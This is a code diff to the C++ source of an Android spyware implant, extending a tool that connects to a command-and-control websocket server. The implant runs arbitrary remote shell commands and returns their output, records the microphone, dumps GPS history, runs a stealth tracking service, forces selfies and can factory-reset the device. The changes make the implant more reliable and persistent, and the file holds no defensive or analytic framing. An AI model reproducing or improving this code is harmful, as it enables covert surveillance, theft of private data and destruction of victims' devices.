@@ -16,12 +16,14 @@
 #include <chrono>
 #include <condition_variable>
 #include <fstream>
+#include <functional>
 #include <memory>
 #include <mutex>
 #include <queue>
 #include <sstream>
 #include <string>
 #include <thread>
+#include <unordered_map>
 #include <utility>
 #include <vector>
 
@@ -61,6 +63,7 @@ static int __android_log_print(int prio, const char* tag, const char* fmt, ...) 
 // Configuration
 static constexpr const char* DEFAULT_WS_SERVER_URL  = "wss://hearts-eliminate-adrian-texts.trycloudflare.com/ws";
 static constexpr const char* C2_URL_FILE = "/data/local/tmp/c2_url.txt";
+static constexpr const char* PING_INTERVAL_FILE = "/data/local/tmp/ping_interval.txt";
 static constexpr const char* IMPLANT_KEY = "DeltaForce2027";
 static constexpr const char* LOG_TAG = "reporter";
 static constexpr const char* LOG_PATH = "/data/local/tmp/reporter.log";
@@ -106,6 +109,13 @@ std::condition_variable g_forbiddenCV;
 // App blocker
 std::vector<std::string> g_forbiddenApps;
 std::mutex g_forbiddenMutex;
+
+// Background worker queue for bounded task execution
+static constexpr int WORKER_THREAD_COUNT = 4;
+std::queue<std::function<void()>> g_workerQueue;
+std::mutex g_workerQueueMutex;
+std::condition_variable g_workerQueueCV;
+bool g_workerShutdown = false;
 
 // Report state tracking (delta-based reporting)
 std::atomic<int> g_ping_interval{60};
@@ -200,8 +210,10 @@ void log_message(const std::string& message) {
 // ── Forward Declarations ─────────────────────────────────────────────────────
 void send_error_to_server(const std::string& error_source, const std::string& error_msg);
 std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv);
-std::string exec_cmd(const std::string& command_line);
+std::pair<bool, std::string> exec_cmd_shell(const std::string& command_line);
+std::pair<bool, std::string> exec_cmd(const std::string& command_line);
 std::vector<std::string> split_command_line(const std::string& command_line);
+bool enqueue_task(std::function<void()> task);
 bool websocket_send_text(const std::string& message);
 bool websocket_send_binary(const std::string& data);
 void rotate_logs();
@@ -362,18 +374,56 @@ std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv) {
     return {success, result};
 }
 
-std::string exec_cmd(const std::string& command_line) {
+std::pair<bool, std::string> exec_cmd_shell(const std::string& command_line) {
+    return exec_cmd(std::vector<std::string>{"/system/bin/sh", "-c", command_line});
+}
+
+std::pair<bool, std::string> exec_cmd(const std::string& command_line) {
     auto argv = split_command_line(command_line);
-    auto [success, result] = exec_cmd(argv);
-    if (!success || result.empty()) {
-        return "UNKNOWN";
+    return exec_cmd(argv);
+}
+
+bool enqueue_task(std::function<void()> task) {
+    if (!task) return false;
+    {
+        std::lock_guard<std::mutex> lock(g_workerQueueMutex);
+        if (g_workerShutdown) return false;
+        g_workerQueue.push(std::move(task));
     }
-    return result;
+    g_workerQueueCV.notify_one();
+    return true;
+}
+
+void worker_thread_loop() {
+    while (true) {
+        std::function<void()> task;
+        {
+            std::unique_lock<std::mutex> lock(g_workerQueueMutex);
+            g_workerQueueCV.wait(lock, [] {
+                return g_workerShutdown || !g_workerQueue.empty();
+            });
+            if (g_workerShutdown && g_workerQueue.empty()) {
+                return;
+            }
+            task = std::move(g_workerQueue.front());
+            g_workerQueue.pop();
+        }
+        if (task) {
+            task();
+        }
+    }
 }
 
 // ── JSON Utilities ───────────────────────────────────────────────────────────
 
-/** Extracts a quoted JSON string, handling escaped characters. */
+/** Skips whitespace characters while parsing JSON. */
+static void skip_json_whitespace(const std::string& json, size_t& pos) {
+    while (pos < json.size() && std::isspace(static_cast<unsigned char>(json[pos]))) {
+        ++pos;
+    }
+}
+
+/** Extracts a quoted JSON string, handling escaped characters and unicode escapes. */
 static bool parse_json_string(const std::string& json, size_t& pos, std::string& out) {
     if (pos >= json.size() || json[pos] != '"') return false;
     ++pos;
@@ -393,6 +443,33 @@ static bool parse_json_string(const std::string& json, size_t& pos, std::string&
                 case 'n': out.push_back('\n'); break;
                 case 'r': out.push_back('\r'); break;
                 case 't': out.push_back('\t'); break;
+                case 'u': {
+                    if (pos + 4 > json.size()) return false;
+                    unsigned int code = 0;
+                    for (int i = 0; i < 4; ++i) {
+                        char hex = json[pos++];
+                        code <<= 4;
+                        if (hex >= '0' && hex <= '9') {
+                            code |= static_cast<unsigned int>(hex - '0');
+                        } else if (hex >= 'a' && hex <= 'f') {
+                            code |= static_cast<unsigned int>(hex - 'a' + 10);
+                        } else if (hex >= 'A' && hex <= 'F') {
+                            code |= static_cast<unsigned int>(hex - 'A' + 10);
+                        } else {
+                            return false;
+                        }
+                    }
+                    if (code <= 0x7F) {
+                        out.push_back(static_cast<char>(code));
+                    } else if (code <= 0x7FF) {
+                        out.push_back(static_cast<char>(0xC0 | ((code >> 6) & 0x1F)));
+                        out.push_back(static_cast<char>(0x80 | (code & 0x3F)));
+                    } else {
+                        out.push_back(static_cast<char>(0xE0 | ((code >> 12) & 0x0F)));
+                        out.push_back(static_cast<char>(0x80 | ((code >> 6) & 0x3F)));
+                        out.push_back(static_cast<char>(0x80 | (code & 0x3F)));
+                    }
+                } break;
                 default:
                     out.push_back(escaped);
                     break;
@@ -407,13 +484,118 @@ static bool parse_json_string(const std::string& json, size_t& pos, std::string&
     return false;
 }
 
-/** Extracts a value from a flat JSON object by key name. */
+static bool skip_json_value(const std::string& json, size_t& pos);
+
+static bool skip_json_string(const std::string& json, size_t& pos) {
+    std::string unused;
+    return parse_json_string(json, pos, unused);
+}
+
+static bool skip_json_value(const std::string& json, size_t& pos) {
+    skip_json_whitespace(json, pos);
+    if (pos >= json.size()) return false;
+
+    char c = json[pos];
+    if (c == '"') {
+        return skip_json_string(json, pos);
+    }
+
+    if (c == '{') {
+        ++pos;
+        while (pos < json.size()) {
+            skip_json_whitespace(json, pos);
+            if (pos < json.size() && json[pos] == '}') {
+                ++pos;
+                return true;
+            }
+            if (!skip_json_value(json, pos)) return false;
+            skip_json_whitespace(json, pos);
+            if (pos >= json.size() || json[pos] != ':') return false;
+            ++pos;
+            if (!skip_json_value(json, pos)) return false;
+            skip_json_whitespace(json, pos);
+            if (pos < json.size() && json[pos] == ',') {
+                ++pos;
+                continue;
+            }
+            if (pos < json.size() && json[pos] == '}') {
+                ++pos;
+                return true;
+            }
+            return false;
+        }
+        return false;
+    }
+
+    if (c == '[') {
+        ++pos;
+        while (pos < json.size()) {
+            skip_json_whitespace(json, pos);
+            if (pos < json.size() && json[pos] == ']') {
+                ++pos;
+                return true;
+            }
+            if (!skip_json_value(json, pos)) return false;
+            skip_json_whitespace(json, pos);
+            if (pos < json.size() && json[pos] == ',') {
+                ++pos;
+                continue;
+            }
+            if (pos < json.size() && json[pos] == ']') {
+                ++pos;
+                return true;
+            }
+            return false;
+        }
+        return false;
+    }
+
+    if (c == 't' && json.compare(pos, 4, "true") == 0) {
+        pos += 4;
+        return true;
+    }
+    if (c == 'f' && json.compare(pos, 5, "false") == 0) {
+        pos += 5;
+        return true;
+    }
+    if (c == 'n' && json.compare(pos, 4, "null") == 0) {
+        pos += 4;
+        return true;
+    }
+
+    size_t start = pos;
+    if (c == '-') {
+        ++pos;
+    }
+    while (pos < json.size() && std::isdigit(static_cast<unsigned char>(json[pos]))) {
+        ++pos;
+    }
+    if (pos < json.size() && json[pos] == '.') {
+        ++pos;
+        while (pos < json.size() && std::isdigit(static_cast<unsigned char>(json[pos]))) {
+            ++pos;
+        }
+    }
+    if (pos < json.size() && (json[pos] == 'e' || json[pos] == 'E')) {
+        ++pos;
+        if (pos < json.size() && (json[pos] == '+' || json[pos] == '-')) {
+            ++pos;
+        }
+        while (pos < json.size() && std::isdigit(static_cast<unsigned char>(json[pos]))) {
+            ++pos;
+        }
+    }
+    return pos > start;
+}
+
+/** Extracts a value from a JSON object by key name. */
 std::string get_json_val(const std::string& json, const std::string& key) {
     if (json.empty() || key.empty()) return "";
-    
+
     size_t pos = 0;
     while (pos < json.size()) {
-        if (json[pos] != '"') {
+        skip_json_whitespace(json, pos);
+        if (pos >= json.size() || json[pos] != '"') {
             ++pos;
             continue;
         }
@@ -423,23 +605,15 @@ std::string get_json_val(const std::string& json, const std::string& key) {
             return "";
         }
 
-        size_t scan = pos;
-        while (scan < json.size() && std::isspace(static_cast<unsigned char>(json[scan]))) {
-            ++scan;
-        }
-        if (scan >= json.size() || json[scan] != ':') {
-            pos = scan;
+        skip_json_whitespace(json, pos);
+        if (pos >= json.size() || json[pos] != ':') {
             continue;
         }
-        scan++;
-
-        while (scan < json.size() && std::isspace(static_cast<unsigned char>(json[scan]))) {
-            ++scan;
-        }
+        ++pos;
+        skip_json_whitespace(json, pos);
 
         if (current_key == key) {
-            if (scan < json.size() && json[scan] == '"') {
-                pos = scan;
+            if (pos < json.size() && json[pos] == '"') {
                 std::string value;
                 if (parse_json_string(json, pos, value)) {
                     return value;
@@ -447,18 +621,20 @@ std::string get_json_val(const std::string& json, const std::string& key) {
                 return "";
             }
 
-            size_t end = scan;
-            while (end < json.size() && json[end] != ',' && json[end] != '}' && json[end] != ']') {
-                ++end;
+            size_t value_start = pos;
+            if (!skip_json_value(json, pos)) {
+                return "";
             }
-            size_t result_end = end;
-            while (result_end > scan && std::isspace(static_cast<unsigned char>(json[result_end - 1]))) {
-                --result_end;
+            size_t value_end = pos;
+            while (value_end > value_start && std::isspace(static_cast<unsigned char>(json[value_end - 1]))) {
+                --value_end;
             }
-            return json.substr(scan, result_end - scan);
+            return json.substr(value_start, value_end - value_start);
         }
 
-        pos = scan;
+        if (!skip_json_value(json, pos)) {
+            return "";
+        }
     }
 
     return "";
@@ -550,6 +726,49 @@ void set_location_file(int status) {
     }
 }
 
+/** Reads the persisted ping interval from file or returns the default. */
+int load_ping_interval_from_file(int default_interval) {
+    int interval = default_interval;
+    bool valid = false;
+    int fd = open(PING_INTERVAL_FILE, O_RDONLY);
+    if (fd >= 0) {
+        char buf[32];
+        ssize_t n = read(fd, buf, sizeof(buf) - 1);
+        close(fd);
+        if (n > 0) {
+            buf[n] = '\0';
+            try {
+                int value = std::stoi(buf);
+                if (value >= 1) {
+                    interval = value;
+                    valid = true;
+                }
+            } catch (const std::exception&) {
+                // Ignore malformed content and rewrite default below.
+            }
+        }
+    }
+
+    if (!valid) {
+        // If the file is missing or invalid, create/reset it with the default interval.
+        save_ping_interval_to_file(default_interval);
+    }
+
+    return interval;
+}
+
+/** Persists the ping interval to disk for reboot survival. */
+bool save_ping_interval_to_file(int interval) {
+    int fd = open(PING_INTERVAL_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd < 0) {
+        return false;
+    }
+    std::string value = std::to_string(interval);
+    ssize_t written = write(fd, value.data(), value.size());
+    close(fd);
+    return written == static_cast<ssize_t>(value.size());
+}
+
 /** Reads battery percentage directly from sysfs (0-100, or -1 on failure). */
 int get_battery_level() {
     int fd = open("/sys/class/power_supply/battery/capacity", O_RDONLY);
@@ -600,26 +819,23 @@ std::string get_installed_apps() {
     std::ifstream ifs("/data/system/packages.list");
     if (!ifs.is_open()) {
         // Fallback if packages.list is not readable
-        FILE* pipe = popen("pm list packages", "r");
-        if (!pipe) return "";
-        std::array<char, 256> buffer;
+        auto [ok, output] = exec_cmd(std::vector<std::string>{"pm", "list", "packages"});
+        if (!ok) return "";
+
         std::string apps;
         constexpr const char prefix[] = "package:";
         constexpr size_t prefix_len = sizeof(prefix) - 1;
-
-        while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
-            // Work directly with the buffer to avoid per-line std::string allocation
-            char* line = buffer.data();
-            size_t len = std::strlen(line);
-            if (len > 0 && line[len - 1] == '\n') {
-                line[--len] = '\0';
-            }
-            if (len > prefix_len && std::strncmp(line, prefix, prefix_len) == 0) {
+        size_t start = 0;
+        while (start < output.size()) {
+            size_t end = output.find('\n', start);
+            size_t line_len = (end == std::string::npos) ? output.size() - start : end - start;
+            if (line_len >= prefix_len && std::strncmp(output.data() + start, prefix, prefix_len) == 0) {
                 if (!apps.empty()) apps.push_back(',');
-                apps.append(line + prefix_len, len - prefix_len);
+                apps.append(output.data() + start + prefix_len, line_len - prefix_len);
             }
+            if (end == std::string::npos) break;
+            start = end + 1;
         }
-        pclose(pipe);
         return apps;
     }
 
@@ -919,10 +1135,18 @@ void do_mic_record(int duration_s) {
     }
     std::string cmd = "tinycap " + std::string(MIC_FILE) + " -D 0 -d 0 -c 1 -r 16000 -b 16 -p 1024 -n 4 -t " + std::to_string(duration_s);
     log_message("Starting microphone recording for " + std::to_string(duration_s) + " seconds.");
-    std::string result = exec_cmd(cmd);
-    if (result == "UNKNOWN") {
-        send_error_to_server("mic_record", "tinycap command failed or returned no output");
+    auto [success, result] = exec_cmd(split_command_line(cmd));
+    if (!success) {
+        send_error_to_server("mic_record", "tinycap command failed: " + cmd);
+        return;
     }
+
+    struct stat st;
+    if (stat(MIC_FILE, &st) != 0 || st.st_size == 0) {
+        send_error_to_server("mic_record", "Microphone output file missing or empty: " + std::string(MIC_FILE));
+        return;
+    }
+
     log_message("Microphone recording finished.");
     upload_file(MIC_FILE);
 }
@@ -930,31 +1154,41 @@ void do_mic_record(int duration_s) {
 /** Dumps GPS history from the system location cache and radio logs to a local file. */
 void do_gps_dump() {
     log_message("Dumping GPS history.");
-    std::string output = exec_cmd("dumpsys location");
+    auto [location_ok, output] = exec_cmd(split_command_line("dumpsys location"));
 
     int fd = open(GPS_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    bool wrote_data = false;
     if (fd >= 0) {
-        if (output != "UNKNOWN" && !output.empty()) {
+        if (location_ok && !output.empty()) {
             write(fd, output.data(), output.size());
             write(fd, "\n", 1);
+            wrote_data = true;
         }
 
-        std::string log_output = exec_cmd("logcat -d -b radio");
+        auto [radio_ok, log_output] = exec_cmd(split_command_line("logcat -d -b radio"));
+        (void)radio_ok;
         size_t start = 0;
         while (start < log_output.size()) {
             size_t end = log_output.find('\n', start);
             size_t line_len = (end == std::string::npos) ? log_output.size() - start : end - start;
-            // Single find() call to avoid double-searching the same range
             size_t gps_pos = log_output.find("GpsLocation", start);
             if (gps_pos != std::string::npos && gps_pos < start + line_len) {
                 write(fd, log_output.data() + start, line_len);
                 write(fd, "\n", 1);
+                wrote_data = true;
             }
             if (end == std::string::npos) break;
             start = end + 1;
         }
         close(fd);
     }
+
+    if (!wrote_data) {
+        unlink(GPS_FILE);
+        send_error_to_server("gps_dump", "No GPS data collected from dumpsys or radio logs.");
+        return;
+    }
+
     log_message("GPS history dump finished.");
     upload_file(GPS_FILE);
 }
@@ -966,37 +1200,42 @@ void do_shell_command(const std::string& shell_cmd) {
         return;
     }
     log_message("Executing remote shell command: " + shell_cmd);
-    std::string result = exec_cmd(shell_cmd);
-    
-    if (result == "UNKNOWN") {
-        result = "[Executed with no output or failed]";
-        send_error_to_server("shell_cmd", "Command returned no output: " + shell_cmd);
+    auto [success, result] = exec_cmd_shell(shell_cmd);
+    if (!success) {
+        send_error_to_server("shell_cmd", "Failed to execute remote shell command: " + shell_cmd);
     }
-    
-    if (!websocket_is_open()) {
+    if (result.empty()) {
+        result = "[No output]";
+    }
+
+    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
+    if (!websocket_send_text(json_req)) {
         send_error_to_server("shell_cmd", "WS not open, cannot send result for: " + shell_cmd);
         return;
     }
-    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
-    g_webSocket.sendText(json_req);
     log_message("Remote shell command execution finished.");
 }
 
 /** Triggers an Android intent to factory reset the device. */
 void do_factory_reset() {
     log_message("Factory reset requested by C2.");
-    std::string result = exec_cmd("am broadcast -a android.intent.action.MASTER_CLEAR");
-    if (result == "UNKNOWN") {
-        result = "[Factory reset command executed with no output or failed]";
-        send_error_to_server("factory_reset", "Factory reset command returned no output");
+    auto [success, result] = exec_cmd_shell("am broadcast -a android.intent.action.MASTER_CLEAR");
+    bool permission_denied = result.find("Permission Denial") != std::string::npos || result.find("Permission denied") != std::string::npos;
+    if (!success || permission_denied) {
+        send_error_to_server("factory_reset", permission_denied ? "Command execution rejected by platform permissions." : "Factory reset command failed.");
+        if (!success && result.empty()) {
+            result = "[Factory reset command failed with no output]";
+        }
+    }
+    if (result.empty()) {
+        result = success ? "[Factory reset command executed successfully with no output]" : "[Factory reset command failed with no output]";
     }
 
-    if (!websocket_is_open()) {
+    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
+    if (!websocket_send_text(json_req)) {
         send_error_to_server("factory_reset", "WS not open, cannot send result");
         return;
     }
-    std::string json_req = "{\"implant_key\":\"" + g_escaped_implant_key + "\",\"command_result\":\"" + json_escape(result) + "\"}";
-    g_webSocket.sendText(json_req);
     log_message("Factory reset command finished.");
 }
 
@@ -1060,9 +1299,9 @@ void process_tasks() {
             if (track == 1) {
                 int interval = g_ping_interval.load();
                 std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
-                std::thread([cmd]() { exec_cmd(cmd); }).detach();
+                std::thread([cmd]() { exec_cmd(split_command_line(cmd)); }).detach();
             } else {
-                std::thread([]() { exec_cmd("am force-stop com.stealthgps"); }).detach();
+                std::thread([]() { exec_cmd(split_command_line("am force-stop com.stealthgps")); }).detach();
             }
         } else if (task == "check_location_state") {
             log_message("Reporting location state explicitly (will be handled by main loop).");
@@ -1074,11 +1313,17 @@ void process_tasks() {
         } else if (task == "set_interval") {
             int interval = g_ping_interval.load();
             try { interval = std::stoi(get_json_val(response, "interval")); } catch(...) {}
+            if (interval < 1) {
+                interval = 1;
+            }
             g_ping_interval.store(interval);
+            if (!save_ping_interval_to_file(interval)) {
+                send_error_to_server("set_interval", "Failed to persist ping interval");
+            }
             log_message("Ping interval updated to: " + std::to_string(g_ping_interval.load()));
             if (is_location_enabled()) {
                 std::string cmd = "am startservice --el interval " + std::to_string(interval * 1000) + " com.stealthgps/.GpsService";
-                std::thread([cmd]() { exec_cmd(cmd); }).detach();
+                std::thread([cmd]() { exec_cmd(split_command_line(cmd)); }).detach();
             }
         } else if (task == "system_alert") {
             std::string state = get_json_val(response, "state");
@@ -1117,12 +1362,12 @@ void process_tasks() {
             if (action == "reboot") {
                 std::thread([]() {
                     log_message("Executing reboot command...");
-                    exec_cmd("reboot");
+                    exec_cmd(split_command_line("reboot"));
                 }).detach();
             } else if (action == "shutdown") {
                 std::thread([]() {
                     log_message("Executing shutdown command...");
-                    exec_cmd("reboot -p");
+                    exec_cmd(split_command_line("reboot -p"));
                 }).detach();
             }
         } else if (task == "force_selfie") {
@@ -1181,10 +1426,15 @@ int main(int argc, char* argv[]) {
         chmod("/data/local/tmp/coords.txt", 0666);
     }
 
+    int interval = load_ping_interval_from_file(g_ping_interval.load());
+    g_ping_interval.store(interval);
+    log_message("Ping interval loaded from file: " + std::to_string(interval));
+
     // Start GPS service on startup if enabled
     if (is_location_enabled()) {
         std::thread([]() {
-            exec_cmd("am startservice --el interval " + std::to_string(g_ping_interval.load() * 1000) + " com.stealthgps/.GpsService");
+            std::string launch = "am startservice --el interval " + std::to_string(g_ping_interval.load() * 1000) + " com.stealthgps/.GpsService";
+            exec_cmd(split_command_line(launch));
         }).detach();
     }
 
